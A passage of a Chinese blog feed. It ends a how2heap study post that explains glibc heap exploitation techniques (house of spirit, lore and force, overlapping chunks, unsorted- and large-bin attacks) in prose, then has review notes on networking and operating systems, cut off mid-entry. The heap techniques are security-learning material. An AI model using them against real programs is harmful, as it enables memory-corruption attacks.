p），试想如果此时我们可以修改一个指针指向的地址同时可以修改另一个指针指向的内容不就可以构成一次任意地址写了吗？巧的是(p)我们恰好可以达到这样的效果。</p><p>此时我们修改fake_chunk[3]为要写的地址，修改fake_chunk[0]为要写的地址的内容即可。原因是fake_chunk[3]-3*size_t&#x3D;fake_chunk，这里相当于给fake_chunk指向一个新的地址；fake_chunk[0]访问的是&amp;fake_chunk[0]地址处的值，即上一步修改的地址处的内容。这样就构成了一次任意地址写。</p><p>结果我们可以看出，我们成功可以修改指定位置的数据:</p><p><img src="/%5Cimages%5Chow2heap3-2.png"></p><h3 id="4-house-of-spirit"><a href="#4-house-of-spirit" class="headerlink" title="4.house_of_spirit"></a>4.house_of_spirit</h3><p>利用fastbin范围的堆释放时粗糙的检查可以在任意地址处伪造fastbin范围fakechunk进而返回fakechunk的一种利用方式。思路是在指定地址处伪造fastbin范围的fakechunk，释放掉伪造的fakechunk，再次申请释放掉的fakechunk大小的堆即可得到fakechunk。</p><p><img src="/%5Cimages%5Chow2heap4.png"></p><p>我们构造的fakechunk只需要绕过free时的检查即可：</p><ol><li><p>2*size_sz&lt;next chunksize&lt;sys mem，即图中0x1234要满足限制在这个范围</p></li><li><p>伪造的fakechunk不能是fastbin的头结点，即不能直接构成doublefree</p></li></ol><p>利用house of spirit可以得到fakechunk处的堆，同时如果我们有fakechunk处写的权限利用fastbinattack即可劫持控制流。</p><p><img src="/%5Cimages%5Chow2heap4-1.png"></p><h3 id="5-house-of-lore"><a href="#5-house-of-lore" class="headerlink" title="5.house_of_lore"></a>5.house_of_lore</h3><p>利用伪造smallbin链表来最终达到一次任意地址分配内存的效果。前提是可以在要分配的地址处伪造堆（修改结构体中fd、bk的指向），且可以修改victim堆（被释放的smallbin堆）的bk指针</p><p>方法是在要分配的内存地址（如栈地址）处构造一个fake smallbin chunk链，使之如下图所示：</p><p><img src="/%5Cimages%5Chow2heap5.png"></p><p>然后申请一个堆防止释放victim的时候合并到topchunk，释放掉victim，此例中victim会进入fastbin链表。</p><p>再次申请一个largechunk，触发fastbin的合并过程并使fastbin的堆进入unsortedbin的处理流程，victim处于smallbin的范围最终被链入smallbin头结点。而由于我们事先构造了如上的fake smallbin链，此时smallbin的链接情况是smallbin:victim-&gt;stack_buf1-&gt;stack_buf2。</p><p>由于smallbin的exact fit和fifo策略，此时申请一个victim大小的堆会直接返回bin结点bk指向的victim（bin的结构体是mchunkptr*），然后断链并修改bin的bk指针指向victim的bk节点即stack_buf1</p><p>此时stack_buf1的结构如下smallbin:stack_buf1-&gt;stack_buf2</p><p>这样此时再申请一个victim大小的堆直接取smallbin的bk指向的stack_buf1即得到相应地址处的堆，达到了任意地址分配内存的效果</p><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6.overlapping_chunks"></a>6.overlapping_chunks</h3><p>通过修改一个位于空闲链表的堆的size域可以构成一次堆重叠。<br>首先申请三块空间，并且将p2 free掉：</p><p><img src="/%5Cimages%5Chow2heap6.png"></p><p>可以看出，空间p1、p2、p3分别用1、2、3填充。<br>然后我们修改p2的size值：</p><p><img src="/%5Cimages%5Chow2heap6-1.png"></p><p>我们看到我们把chunksize修改为0x181。当我们再次申请一个p2 size大小的堆的时候，会得到从p2位置起始的fake size大小的堆p4。<br>如果我们向p4写入fake size的数据时，会将p3的数据覆盖掉：</p><p><img src="/%5Cimages%5Chow2heap6-2.png"></p><p>本质就是修改一个位于空闲链表的堆的size域可以构成一次堆重叠。</p><h3 id="7-overlapping-chunks-2"><a href="#7-overlapping-chunks-2" class="headerlink" title="7.overlapping_chunks_2"></a>7.overlapping_chunks_2</h3><p>原理：通过堆溢出修改下一个占用态堆的size域构成一次堆重叠<br>free p4后p5的prevsize为0x3f0:</p><p><img src="/%5Cimages%5Chow2heap7.png"></p><p>修改p2的size域为p2+p3+标志位，释放掉。此时glibc会认为p2的size域的大小包围的堆是要被释放的，会错误的修改p5的prevsize值。Free之后我们查看p5的prevsize为：</p><p><img src="/%5Cimages%5Chow2heap7-1.png"></p><p><img src="/%5Cimages%5Chow2heap7-2.png"></p><p>此时由于物理相邻的前向堆p4处于空闲态，fake p2会和p4合并链入largebin。然后申请2000大小的largechunk会将上述合并后的堆切割后返回p2起始的堆，从而构成一次堆重叠</p><p><img src="/%5Cimages%5Chow2heap7-3.png"></p><p>然后将p6写入1500字节F，打印出p3结果：</p><p><img src="/%5Cimages%5Chow2heap7-4.png"></p><p>我们可以看出p6写入时成功覆盖掉p3前500字节，成功依靠p2 free后重申请修改了p3。</p><h3 id="8-house-of-force"><a href="#8-house-of-force" class="headerlink" title="8.house_of_force"></a>8.house_of_force</h3><p>原理：利用topchunk分配内存的特点可以通过一次溢出覆盖topchunk的size域得到一次任意地址分配内存的效果。<br>首先通过一次堆溢出覆盖topchunk的size域为一个超大的整数（如-1），避免申请内存时进入mmap流程：</p><p><img src="/%5Cimages%5Chow2heap8.png"></p><p>然后申请一个evilsize大小的堆改变topchunk的位置。evilsize的计算如下，这么计算的原因是当bin都为空时会从topchunk处取堆：</p><p><img src="/%5Cimages%5Chow2heap8-1.png"></p><p>修改topchunk到目标地址后在申请一次堆即可对目标地址处的内存进行改写：</p><p><img src="/%5Cimages%5Chow2heap8-2.png"></p><h3 id="9-unsorted-bin-into-stack"><a href="#9-unsorted-bin-into-stack" class="headerlink" title="9.unsorted_bin_into_stack"></a>9.unsorted_bin_into_stack</h3><p>通过修改位于unsorted bin的victim堆的size域和bk指针指向目标fake chunk（stack_buffer），在目标地址构造fake chunk（构造size和bk指针。我们也可以不修改victim的size，malloc两次得到目标地址的fake chunk；原理都是构造fake unsorted bin链表）可以得到一次任意地址申请内存的机会。</p><p><img src="/%5Cimages%5Chow2heap9.png"></p><p>改变victim的值要满足check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</p><p><img src="/%5Cimages%5Chow2heap9-1.png"></p><p>下一次申请内存时，遍历unsortedbin时可以得到目标地址处的伪造堆：</p><p><img src="/%5Cimages%5Chow2heap9-2.png"></p><h3 id="10-unsorted-bin-attack"><a href="#10-unsorted-bin-attack" class="headerlink" title="10.unsorted_bin_attack"></a>10.unsorted_bin_attack</h3><p>通过伪造unsortbin链表进行unsortedbin attack泄露信息（libc基址）的一种方法<br>定义一个stack_var的变量，用于后面获取bin的基址，后面申请了一块空间，之后内存布局如下：p-&gt;fd &#x3D;  bin  p-&gt;bk &#x3D; &amp;stack_var。</p><p><img src="/%5Cimages%5Chow2heap10.png"></p><p>最后再malloc的时候，前一个块会被分配出去，然后p就会指向bin的基地址，因而暴露了敏感信息：</p><p><img src="/%5Cimages%5Chow2heap10-1.png"></p><h3 id="11-large-bin-attack"><a href="#11-large-bin-attack" class="headerlink" title="11.large_bin_attack"></a>11.large_bin_attack</h3><p>原理：利用malloc进行unsortedbin处理时插入largebin通过修改largebin链表上的堆的bk、bk_nextsize均可以得到任意地址写的机会。<br>首先要申请如上图3个堆和相应的为了避免合并到topchunk的barrier，其中p1要保证是smallbin且非fastbin范围（且保证在后续申请堆时堆大小够用），p2、p3要保证是largebin范围。</p><p><img src="/%5Cimages%5Chow2heap11.png"></p><p>（1）然后依次释放p1、p2，由于非fastbin范围的堆在释放后会首先链入unsortedbin，此时unsortedbin的情况是：unsortedbin:p2-&gt;p1</p><p><img src="/%5Cimages%5Chow2heap11-1.png"></p><p>（2）此时申请一个0x90大小的堆，从glibc的源码中可以看到遍历unsortedbin的过程是从bin头结点的bk指针开始遍历。这样取到的第一个堆是0x320大小的p1，p1满足0x90的申请，glibc会从p1中分割出0x90的大小，然后继续遍历unsortedbin直至遍历结束；此时得到链表的第二个堆0x400大小的p2，p2非smallbin范围且largebin为空，被链入largebin：</p><p><img src="/%5Cimages%5Chow2heap11-2.png"></p><p>此时unsortbin：(p1-0x90)，largebin：p2。<br>然后释放0x400大小的p3，p3非fastbin范围被链入unsortedbin头结点（fd指向p3）<br>（3）此时利用溢出或其他手段修改largebin中的p2的bk、bk_nextsize和size。可以看到p2修改前的size为0x411，代码中把它修改成了0x3f1，这样做是因为largebin中链接的一定范围的堆是从大到小降序排列的，修改后0x400大小的p3被链入largebin时会被链入头结点。</p><p>在做好以上的准备工作后再次申请一个0x90大小的堆，同（2）过程依然由p2分割得到堆，由于p3&gt;修改后的p2的size，p3被链入largebin头结点。链入的过程类似unlink，类似的我们得到了一次任意地址写的机会。</p><p><img src="/%5Cimages%5Chow2heap11-3.png"></p><p>执行结果：</p><p><img src="/%5Cimages%5Chow2heap11-4.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>堆栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-计算机网络</title>
    <link href="/blog/2020/04/14/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/blog/2020/04/14/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<p><strong>计算机网络也是一门很重要的专业基础课，主要包含五层协议以及每层协议中不同的协议，协议作用与区别等。</strong></p><p><img src="/%5Cimages%5Cfj40.jpg"></p><span id="more"></span><h2 id="计算机网络层次模型"><a href="#计算机网络层次模型" class="headerlink" title="计算机网络层次模型"></a>计算机网络层次模型</h2><h3 id="OSI七层模型及TCP-x2F-IP五层协议"><a href="#OSI七层模型及TCP-x2F-IP五层协议" class="headerlink" title="OSI七层模型及TCP&#x2F;IP五层协议"></a>OSI七层模型及TCP&#x2F;IP五层协议</h3><p><img src="/%5Cimages%5Cosi.png"></p><p>下面简单说一下各层主要协议的特点及其应用。</p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用。应用层协议定义的是应用进程（进程：主机中正在运行的程序）间的通信和交互的规则。对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统DNS，支持万维网应用的 HTTP协议，支持电子邮件的 SMTP协议等等。我们把应用层交互的数据单元称为报文。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。应用进程利用该服务传送应用层报文。“通用的”是指并不针对某一个特定的网络应用，而是多种应用可以使用同一个运输层服务。由于一台主机可同时运行多个线程，因此运输层有复用和分用的功能。所谓复用就是指多个应用层进程可同时使用下面运输层的服务，分用和复用相反，是运输层把收到的信息分别交付上面应用层中的相应进程。<br>传输层主要使用以下两种协议：</p><ul><li>传输控制协议 TCP（Transmisson Control Protocol）–提供面向连接的，可靠的数据传输服务。</li><li>用户数据协议 UDP（User Datagram Protocol）–提供无连接的，尽最大努力的数据传输服务（不保证数据传输的可靠性）。</li></ul><h4 id="UDP-的主要特点"><a href="#UDP-的主要特点" class="headerlink" title="UDP 的主要特点"></a>UDP 的主要特点</h4><ol><li>UDP 是无连接的；</li><li>UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态（这里面有许多参数）；<br>UDP 是面向报文的；</li><li>UDP 没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如 直播，实时视频会议等）；</li><li>UDP 支持一对一、一对多、多对一和多对多的交互通信；</li><li>UDP 的首部开销小，只有8个字节，比TCP的20个字节的首部要短。</li></ol><h4 id="TCP-的主要特点"><a href="#TCP-的主要特点" class="headerlink" title="TCP 的主要特点"></a>TCP 的主要特点</h4><ol><li>TCP 是面向连接的。（就好像打电话一样，通话前需要先拨号建立连接，通话结束后要挂机释放连接）；</li><li>每一条 TCP 连接只能有两个端点，每一条TCP连接只能是点对点的（一对一）；</li><li>TCP 提供可靠交付的服务。通过TCP连接传送的数据，无差错、不丢失、不重复、并且按序到达；</li><li>TCP 提供全双工通信。TCP 允许通信双方的应用进程在任何时候都能发送数据。TCP 连接的两端都设有发送缓存和接收缓存，用来临时存放双方通信的数据；</li><li>面向字节流。TCP 中的“流”（Stream）指的是流入进程或从进程流出的字节序列。“面向字节流”的含义是：虽然应用程序和 TCP 的交互是一次一个数据块（大小不等），但 TCP 把应用程序交下来的数据仅仅看成是一连串的无结构的字节流。</li></ol><p>详情见：<a href="https://chujian521.github.io/blog/2018/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">计算机网络基本知识</a></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>在 计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。 在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组和包进行传送。在 TCP&#x2F;IP 体系结构中，由于网络层使用 IP 协议，因此分组也叫 IP 数据报 ，简称 数据报 packet。</p><p>路由器工作在网络层。</p><h4 id="常见路由协议及其区别"><a href="#常见路由协议及其区别" class="headerlink" title="常见路由协议及其区别"></a>常见路由协议及其区别</h4><p>常见的路由选择协议有：RIP协议、OSPF协议。<br>RIP协议：底层是贝尔曼福特算法，它选择路由的度量标准（metric)是跳数，最大跳数是15跳，如果大于15跳，它就会丢弃数据包。<br>OSPF协议：底层是迪杰斯特拉算法，是链路状态路由选择协议，它选择路由的度量标准是带宽，延迟。</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>数据链路层(data link layer)通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。 在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP 数据报组装程帧，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。</p><p>网桥、交换机工作在数据链路层。</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>在物理层上所传送的数据单位是比特。<br>物理层(physical layer)的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。 使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。</p><p>中继器、集线器、网线是工作在物理层。</p><p><img src="/%5Cimages%5Cosi1.png"></p><h2 id="从发起http请求之后发生了什么？"><a href="#从发起http请求之后发生了什么？" class="headerlink" title="从发起http请求之后发生了什么？"></a>从发起http请求之后发生了什么？</h2><p>详见：<a href="https://chujian521.github.io/blog/2018/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%BA%8C%EF%BC%89/">计算机网络基础</a></p><h2 id="TCP如何保证可靠传输"><a href="#TCP如何保证可靠传输" class="headerlink" title="TCP如何保证可靠传输"></a>TCP如何保证可靠传输</h2><ul><li>应用数据被分割成 TCP 认为最适合发送的数据块。</li><li>TCP 给发送的每一个包进行编号，接收方对数据包进行排序，把有序数据传送给应用层。</li><li>校验和： TCP 将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。</li><li>TCP 的接收端会丢弃重复的数据。</li><li>流量控制： TCP 连接的每一方都有固定大小的缓冲空间，TCP的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议。 （TCP 利用滑动窗口实现流量控制）</li><li>拥塞控制： 当网络拥塞时，减少数据的发送。</li><li>停止等待协议 也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。 超时重传： 当 TCP 发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。</li></ul><h3 id="停等ARQ"><a href="#停等ARQ" class="headerlink" title="停等ARQ"></a>停等ARQ</h3><ul><li>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组；</li><li>在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认；</li></ul><ol><li>无差错情况:</li></ol><p><img src="/%5Cimages%5Carq1.png"></p><p>发送方发送分组,接收方在规定时间内收到,并且回复确认.发送方再次发送。</p><ol start="2"><li>出现差错情况（超时重传）:</li></ol><p><img src="/%5Cimages%5Carq2.png"></p><p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为 自动重传请求 ARQ 。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议 可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</p><ol start="3"><li>确认丢失和确认迟到</li></ol><p>确认丢失：确认消息在传输过程丢失</p><p><img src="/%5Cimages%5Carq3.png"></p><p>当A发送M1消息，B收到后，B向A发送了一个M1确认消息，但却在传输过程中丢失。而A并不知道，在超时计时过后，A重传M1消息，B再次收到该消息后采取以下两点措施：</p><ul><li>丢弃这个重复的M1消息，不向上层交付。</li><li>向A发送确认消息。（不会认为已经发送过了，就不再发送。A能重传，就证明B的确认消息丢失）。</li></ul><p>确认迟到 ：确认消息在传输过程中迟到</p><p><img src="/%5Cimages%5Carq4.png"></p><p>A发送M1消息，B收到并发送确认。在超时时间内没有收到确认消息，A重传M1消息，B仍然收到并继续发送确认消息（B收到了2份M1）。此时A收到了B第二次发送的确认消息。接着发送其他数据。过了一会，A收到了B第一次发送的对M1的确认消息（A也收到了2份确认消息）。处理如下：</p><ul><li>A收到重复的确认后，直接丢弃。</li><li>B收到重复的M1后，也直接丢弃重复的M1。</li></ul><h3 id="自动重传请求-ARQ-协议"><a href="#自动重传请求-ARQ-协议" class="headerlink" title="自动重传请求 ARQ 协议"></a>自动重传请求 ARQ 协议</h3><p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求ARQ。<br><strong>优点：</strong> 简单<br><strong>缺点：</strong> 信道利用率低</p><h3 id="Go-Back-N"><a href="#Go-Back-N" class="headerlink" title="Go-Back-N"></a>Go-Back-N</h3><p>连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。<br><strong>优点：</strong> 信道利用率高，容易实现，即使确认丢失，也不必重传。<br><strong>缺点：</strong> 不能向发送方反映出接收方已经正确收到的所有分组的信息。 比如：发送方发送了 5条 消息，中间第三条丢失（3号），这时接收方只能对前两个发送确认。发送方无法知道后三个分组的下落，而只好把后三个全部重传一次</p><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。</p><p><strong>滑动窗口：</strong></p><p>滑动窗口（Sliding window）是一种流量控制技术。早期的网络通信中，通信双方不会考虑网络的拥挤情况直接发送数据。由于大家不知道网络拥塞状况，同时发送数据，导致中间节点阻塞掉包，谁也发不了数据，所以就有了滑动窗口机制来解决此问题。<br>TCP 中采用滑动窗口来进行传输控制，滑动窗口的大小意味着接收方还有多大的缓冲区可以用于接收数据。发送方可以通过滑动窗口的大小来确定应该发送多少字节的数据。当滑动窗口为 0 时，发送方一般不能再发送数据报，但有两种情况除外，一种情况是可以发送紧急数据，例如，允许用户终止在远端机上的运行进程。另一种情况是发送方可以发送一个 1 字节的数据报来通知接收方重新声明它希望接收的下一字节及发送方的滑动窗口大小。</p><h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。<br>为了进行拥塞控制，TCP 发送方要维持一个 拥塞窗口(cwnd) 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。<br>TCP的拥塞控制采用了四种算法，即 慢开始 、 拥塞避免 、快重传 和 快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</p><h4 id="慢开始"><a href="#慢开始" class="headerlink" title="慢开始"></a>慢开始</h4><p>慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd初始值为1，每经过一个传播轮次，cwnd加倍。拥塞避免算法的思路是让拥塞窗口cwnd缓慢增大，即每经过一个往返时间RTT就把发送放的cwnd加1。</p><h4 id="快重传与快恢复"><a href="#快重传与快恢复" class="headerlink" title="快重传与快恢复"></a>快重传与快恢复</h4><p>在 TCP&#x2F;IP 中，快速重传和恢复（fast retransmit and recovery，FRR）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有 FRR，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了 FRR，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机接收到三个重复确认，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了 FRR，就不会因为重传时要求的暂停被耽误。 　当有单独的数据包丢失时，快速重传和恢复（FRR）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-操作系统原理及安全</title>
    <link href="/blog/2020/04/07/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8/"/>
    <url>/blog/2020/04/07/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>从今天开始复习专业课，准备保研夏令营的面试工作，复习一下专业课，争取能去个比较好的学校。</strong></p><p><img src="/%5Cimages%5Cfj39.jpg"></p><span id="more"></span><h2 id="0x00进程和线程概念及区别"><a href="#0x00进程和线程概念及区别" class="headerlink" title="0x00进程和线程概念及区别"></a>0x00进程和线程概念及区别</h2><h3 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a>进程的概念</h3><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p><p>内存中的进程从高到低：栈-&gt;          &lt;-堆      数据     文本（代码）  </p><h3 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">就绪状态：进程已获得除处理机以外的所需资源，等待分配处理机资源；<br>运行状态：占用处理机资源运行，处于此状态的进程数小于等于<span class="hljs-meta">CPU</span>数；<br>阻塞状态： 进程等待某种条件，在条件满足之前无法执行；<br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5Cprocessstate.png"></p><h3 id="进程间的通信方式"><a href="#进程间的通信方式" class="headerlink" title="进程间的通信方式"></a>进程间的通信方式</h3><ol><li>管道（pipe）及命名管道（named pipe）：管道可用于具有亲缘关系的父子进程间的通信，有名管道除了具有管道所具有的功能外，它还允许无亲缘关系进程间的通信；</li><li>信号（signal）：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生；</li><li>消息队列：消息队列是消息的链接表，它克服了上两种通信方式中信号量有限的缺点，具有写权限得进程可以按照一定得规则向消息队列中添加新信息；对消息队列有读权限得进程则可以从消息队列中读取信息；</li><li>共享内存：可以说这是最有用的进程间通信方式。它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据得更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等</li><li>信号量：主要作为进程之间及同一种进程的不同线程之间得同步和互斥手段；</li><li>套接字：这是一种更为一般得进程间通信机制，它可用于网络中不同机器之间的进程间通信，应用非常广泛。</li></ol><h3 id="进程控制块PCB"><a href="#进程控制块PCB" class="headerlink" title="进程控制块PCB"></a>进程控制块PCB</h3><p>包括以下内容：</p><ul><li>进程状态</li><li>程序计数器</li><li>CPU寄存器</li><li>CPU调度信息</li><li>内存管理信息</li><li>记账信息</li><li>I&#x2F;O状态信息</li></ul><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>新的进程开始时处于就绪队列，它在就绪队列中等待直到被选中执行或被派遣。当进程分配到CPU并执行时，它可能发生以下几种事件的一种：</p><ul><li>进程可能发出一个I&#x2F;O请求，并被放到I&#x2F;O队列中。</li><li>进程可能创建一个新的子进程，并等待其结束。</li><li>进程可能会由于中断而强制释放CPU，并被放回到就绪队列</li></ul><p><img src="/%5Cimages%5Cprocessdiaodu.png"></p><h3 id="线程的概念"><a href="#线程的概念" class="headerlink" title="线程的概念"></a>线程的概念</h3><p>线程（英语：thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程。</p><p><img src="/%5Cimages%5Cthreading.png"></p><h3 id="多线程模型"><a href="#多线程模型" class="headerlink" title="多线程模型"></a>多线程模型</h3><ul><li>多对一模型：多个用户线程对应一个内核线程，效率高但是如果有一个线程阻塞系统调用，那么整个进程会阻塞</li><li>一对一模型（多数）：将每个用户线程映射到一个内核线程，提供更好的并发功能，缺点就是每创建一个用户线程就要创建一个对应的内核线程，开销太大</li><li>多对多模型：多路复用了许多用户线程到同样数量或者更小数量的内核线程上</li></ul><h3 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h3><ol><li>互斥量 Synchronized&#x2F;Lock：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问</li><li>信号量 Semphare：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量</li><li>事件(信号)，Wait&#x2F;Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作</li></ol><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ul><li>进程是对运行时程序的封装，是系统进行资源调度和分配的的基本单位，实现了操作系统的并发；</li><li>线程是进程的子任务，是CPU调度和分派的基本单位，用于保证程序的 实时性，实现进程内部的并发；</li><li>一个程序至少有一个进程，一个进程至少有一个线程，线程依赖于进程而存在；</li><li>进程在执行过程中拥有独立的内存单元，而多个线程共享进程的内存。</li></ul><h2 id="0x01死锁及其成因"><a href="#0x01死锁及其成因" class="headerlink" title="0x01死锁及其成因"></a>0x01死锁及其成因</h2><h3 id="死锁的概念"><a href="#死锁的概念" class="headerlink" title="死锁的概念"></a>死锁的概念</h3><p>在两个或者多个并发进程中，如果每个进程持有某种资源而又等待其它进程释放它或它们现在保持着的资源，在未改变这种状态之前都不能向前推进，称这一组进程产生了死锁。通俗的讲，就是两个或多个进程无限期的阻塞、相互等待的一种状态。</p><h3 id="死锁产生的四个必要条件"><a href="#死锁产生的四个必要条件" class="headerlink" 